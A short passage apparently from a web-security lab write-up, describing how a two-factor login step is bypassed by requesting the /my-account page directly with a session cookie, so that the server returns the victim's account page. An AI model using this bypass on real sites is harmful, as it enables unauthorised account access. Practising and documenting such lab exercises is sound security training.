## Exploit

Without submitting the verification code, the browser was manually directed to:

```http
GET /my-account HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=<authenticated_session>
```

The server returned the victim's account page instead of redirecting back to the verification step.

